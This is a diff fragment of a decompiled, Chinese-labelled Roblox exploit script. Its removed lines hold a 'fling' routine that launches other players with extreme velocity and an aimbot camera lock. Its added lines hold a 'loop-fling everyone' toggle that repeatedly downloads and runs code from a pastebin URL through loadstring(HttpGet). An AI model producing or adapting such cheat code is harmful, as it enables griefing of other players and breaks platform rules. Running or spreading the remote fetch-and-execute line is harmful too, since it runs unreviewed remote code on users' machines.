-                                                                r4_57 = r5_56.Sit
-                                                                if not r4_57 then
-                                                                    r4_57 = r2_56.Health
-                                                                    if r4_57 > 0 then
-                                                                        r4_57 = tick()
-                                                                        if r2_57 + r1_57 < r4_57 then
-                                                                            break
-                                                                        end
-                                                                    else
-                                                                        break
-                                                                    end
-                                                                else
-                                                                    break
-                                                                end
-                                                            else
-                                                                break
-                                                            end
-                                                        else
-                                                            break
-                                                        end
-                                                    else
-                                                        break
-                                                    end
-                                                else
-                                                    break
-                                                end
-                                            else
-                                                break
-                                            end
-                                        end
-                                    end
-                                    workspace.FallenPartsDestroyHeight = 0 / 0
-                                    local r12_56 = Instance.new("BodyVelocity")
-                                    r12_56.Name = "EpixVel"
-                                    r12_56.Parent = r3_56
-                                    r12_56.Velocity = Vector3.new(900000000, 900000000, 900000000)
-                                    r12_56.MaxForce = Vector3.new(1 / 0, 1 / 0, 1 / 0)
-                                    r2_56:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
-                                    if r6_56 and r7_56 then
-                                        if (r6_56.CFrame.p - r7_56.CFrame.p).Magnitude > 5 then
-                                            r11_56(r7_56)
-                                        else
-                                            r11_56(r6_56)
-                                        end
-                                    elseif r6_56 and not r7_56 then
-                                        r11_56(r6_56)
-                                    elseif not r6_56 and r7_56 then
-                                        r11_56(r7_56)
-                                    elseif not r6_56 and not r7_56 and r8_56 and r9_56 then
-                                        r11_56(r9_56)
-                                    else
-                                        return r5_55("wdfex脚本", "已开/关", 5)
-                                    end
-                                    r12_56:Destroy()
-                                    r2_56:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
-                                    workspace.CurrentCamera.CameraSubject = r2_56
-                                    repeat
-                                        r3_56.CFrame = getgenv().OldPos * CFrame.new(0, 0.5, 0)
-                                        r1_56:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, 0.5, 0))
-                                        r2_56:ChangeState("GettingUp")
-                                        table.foreach(r1_56:GetChildren(), function(r0_59, r1_59)
-                                            if r1_59:IsA("BasePart") then
-                                                local r2_59 = Vector3.new()
-                                                r1_59.RotVelocity = Vector3.new()
-                                                r1_59.Velocity = r2_59
-                                            end
-                                        end)
-                                        task.wait()
-                                    until (r3_56.Position - getgenv().OldPos.p).Magnitude < 25
-                                    workspace.FallenPartsDestroyHeight = getgenv().FPDH
-                                else
-                                    local r10_56 = r5_55
-                                    local r11_56 = "玩家消失"
-                                    local r12_56 = "已停止"
-                                    local r13_56 = 5
-                                    r10_56(r11_56, r12_56, r13_56)
-                                end
-                            end
-                            if r0_55[1] then
-                                for r10_55, r11_55 in next, r0_55, nil do
-                                    r4_55(r11_55)
-                                end
-                            else
-                                return 
-                            end
-                            if r3_55 then
-                                local r7_55 = next
-                                local r8_55, r9_55 = r1_55:GetPlayers()
-                                for r10_55, r11_55 in r7_55, r8_55, r9_55 do
-                                    r6_55(r11_55)
-                                end
-                            end
-                            for r10_55, r11_55 in next, r0_55, nil do
-                                if r4_55(r11_55) and r4_55(r11_55) ~= r2_55 then
-                                    if r4_55(r11_55).UserId ~= 1414978355 then
-                                        local r12_55 = r4_55(r11_55)
-                                        if r12_55 then
-                                            r6_55(r12_55)
-                                        end
-                                    else
-                                        r5_55("检测到玩家消失", "已停止", 5)
-                                    end
-                                elseif not r4_55(r11_55) and not r3_55 then
-                                    r5_55("未获取到玩家或工具", "已停止", 5)
-                                end
-                            end
-                        end)
+                        end
+                        task.wait(0.1)
                     end
                 end)
             end
         end
     })
 
-    TeleportFlingTab:Toggle({
-        Title = "开启指定自瞄目标",
+    getgenv().IsFlingAllEnabled = false
+    getgenv().FlingAllThread = nil
+    AllSection:Toggle({
+        Title = "循环甩飞所有人",
         Value = false,
-        Callback = function(r0_462)
-            if r0_462 then
-                while r0_462 do
-                    local r1_462 = workspace.CurrentCamera
-                    local r2_462 = game.Players:FindFirstChild(PlayerConfig.playernamedied)
-                    local cf = getTargetCFrame(r2_462)
-                    if cf and r1_462 then
-                        r1_462.CFrame = CFrame.new(r1_462.CFrame.Position, r1_462.CFrame.Position + (cf.Position - r1_462.CFrame.Position).unit)
-                        wait()
-                    else
-                        if r2_462 then requestStreamAround(r2_462) end
-                        wait(0.3)
+        Callback = function(IJ)
+            getgenv().IsFlingAllEnabled = IJ
+            if getgenv().FlingAllThread then
+                pcall(function() task.cancel(getgenv().FlingAllThread) end)
+                getgenv().FlingAllThread = nil
+            end
+            if IJ then
+                getgenv().FlingAllThread = spawn(function()
+                    while getgenv().IsFlingAllEnabled do
+                        task.wait(0.5)
+                        loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
                     end
-                end
+                end)
             end
         end
     })
